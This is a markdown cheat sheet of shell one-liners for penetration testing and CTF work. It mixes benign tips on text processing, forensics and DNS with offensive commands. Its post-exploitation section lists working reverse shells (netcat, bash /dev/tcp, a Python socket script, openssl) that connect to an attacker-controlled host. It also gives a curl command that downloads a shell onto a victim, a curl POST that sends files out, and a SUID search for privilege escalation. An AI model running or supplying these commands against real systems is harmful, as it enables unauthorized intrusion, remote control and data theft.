# Text manipulation
* Strip HTML tags
```
cat <file.html> | sed 's/<[^>]*>//g'
```

# Binaries
* Convert binary string into an executable file
```
cat <file> | perl -lpe '$_=pack"B*",$_' > file.bin
```

# Privilege excalation
* Find SUID executables owned by root
```
find / -user root -perm -4000 2>/dev/null -exec ls -ldb {} \;
```

# Post exploitation
```
* Netcat reverse shell
root@kali:~# nc -nvlp 8081
victim@victim:~$ mknod /tmp/backpipe p 
victim@victim:~$ /bin/sh 0</tmp/backpipe | nc <attacker ip>/ 8081 1>/tmp/backpipe
```

* Bash revese shell
```
root@kali:~# nc -nvlp 8081
victim@victim:~$ bash -i >& /dev/tcp/1.1.1.1/8081 0>&1
```

* Standard python shell
```
python -c 'import pty; pty.spawn("/bin/bash")'  
```

* Python shell to upload
```python
#!/usr/bin/python

import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("<my ip address>",8081));
os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);
p=subprocess.call(["/bin/sh","-i"]);
```

* Download a shell on remote
```
root@kali:~# python -m SimpleHTTPServer 8081
victim@victim:~$ curl <myip>:8081/shell.py -o /tmp/shell.py
```

* ShellPop python reverse shell
```
shellpop --reverse --number 1 --host <ip> --port <port>
```

* Change password with one command
```
echo -e "password\npassword" | passwd user
```

* Run a web server to download files
```
python -m SimpleHTTPServer 9999
```

* Send a file in the body of a POST request
```
curl -d @/<file> <remote server>
```

* Encrypted reverse shell
```
Local
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
openssl s_server -quiet -key key.pem -cert cert.pem -port <port>
Remote
mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect <ip>:<port> > /tmp/s; rm /tmp/s
SHELL=/bin/bash script -q /dev/null
export TERM=xterm-256color
CTRL+Z.
stty raw -echo
fg
reset
```

# Forensics
* Find non empty directories with depth=1
```
find . -mindepth 1 -maxdepth 1 -not -empty -type d
```

* List and mount vhd volumes (libguestfs-tools)
```
virt-list-filesystems <volume.vhd>
guestmount -a <volume.vhd> -m <device> -r <directory> -o allow_other
```

# Buffer overflow
* Find string offset (pwntools)
```
cyclic 100
p32(address)
```

# Regexes
* Extract domains from file
```
cat <file> | grep -oE "http://[a-z0-9\.]*/" | sed 's/\///g' | sed 's/http://g
```

* Replace some character (A) with some other character (B)
```
cat <file> | tr A B
```

# OSINT
* Get all DNS records
```
dig @dns.server.com domain.com ANY +noall +answer
```

# Python crypto
Use Crypto.Util.number.bytes_to_long and Crypto.Util.number.long_to_bytes
